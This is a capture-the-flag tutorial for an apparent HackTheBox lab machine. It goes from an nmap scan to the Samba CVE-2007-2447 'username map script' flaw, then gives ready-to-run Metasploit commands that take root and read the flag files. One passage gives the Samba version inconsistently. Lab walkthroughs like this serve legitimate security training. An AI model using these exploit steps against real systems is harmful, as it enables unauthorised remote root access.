### Knowledge requirements:

1. CMD UNIX/Linux.
2. Network fundamentals.


### Beginning of the tutorial:

We start with a IP check connection:


```
ping 10.10.10.3
```

Connection succeeded. Now we run `nmap` and save the output in "output_nmap.txt":

```
nmap -sC -sV 10.10.10.3 -oN output_nmap.txt
```

`nmap` is a tool to scan and obtain hosts information within a network. It is highly used in network auditories. It allows administrators to discover hosts and network services, as well as open ports, operating systems or software versions.

`-sC`: This argument activates the scripts that belong to `nmap's library`. It activates "default" and "safe" scripts to provide information about services and applications executed on the detected ports.

`-sV`: This argument tries to determine the service version of the open ports.

We see some open ports and choose the following: `445/tcp open netbios-ssn samba smbd 3.0.20-Debian (workgroup: WORKGROUP)`

Details about the service and software version of this port:

1) `Port 445/tcp` is used by SMB service for communication. It is known to be susceptible to various types of attacks. Including DoS, shared resource enumeration and remote code execution (if vulnerabilities exist).

2) `Samba` service is an implementation of SMB (Server Message Block) protocol that enables interoperability between Linux/UNIX and Windows systems.
It facilitates file and printer sharing between Windows and Unix/Linux-based systems.

3) `smbd 2.0.20-Debian`version. Knowing the software version can be useful in determining if there is a known vulnerability associated to this port. The older the version, the more likely it is to have several vulnerabilities that can be exploited. You can check on vulnerability databases (e.g., [CVE](https://cve.mitre.org/cve/search_cve_list.html)) to see if there are exploits or attack techniques that can be leveraged.

Checking on Google (or using [CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2447)) `Samba smbd 3.0.20-Debian` you can observe the `CVE-2007-2447 Samba "username map script" Command Execution`[in rapid7 website](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/).

Rapid7 webpage provides the information to load the needed module and exploit this vulnerability. To do so, we call `metasploit`. Run:
```
msfconsole
use exploit/multi/samba/usermap_script
set rhost 10.10.10.3
```
`set rhost 10.10.10.3` Specifies the remote host that you intend to interact with. It uses the payload automatically. In metasploit terminology, a `payload` refers to the component of an exploit module that performs a specific action on a target system. Then execute:

```
whoami
```
To verify that we are a root user. Then run:
```
cd home/
ls -la
```
Check for the folder `makis`, access it and get the outcome of "user.txt". For that run:
```
cd makis
cat user.txt
```
The same for root user. In one command:
```
cat /root/root.txt
```
Which is the information you must introduce into HackTheBox.

#### End of the tutorial.
